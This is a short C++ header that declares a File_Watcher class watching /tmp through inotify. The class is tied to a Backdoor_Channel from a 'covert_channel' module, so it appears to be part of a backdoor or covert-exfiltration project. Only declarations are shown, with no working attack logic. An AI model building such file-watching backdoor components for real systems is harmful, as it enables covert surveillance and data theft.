#ifndef File_Watcher_H
#define File_Watcher_H

#include <string>
#include <inotifytools/inotifytools.h>
#include "../covert_channel/backdoor_channel.h"
using std::string;

class File_Watcher
{
public:
    File_Watcher();
    File_Watcher(Backdoor_Channel& bc) : ch(bc) {};
    void start(string folder);

private:
    const char* WATCH_DIR = "/tmp";
    Backdoor_Channel &ch;
    int run();
};

#endif 
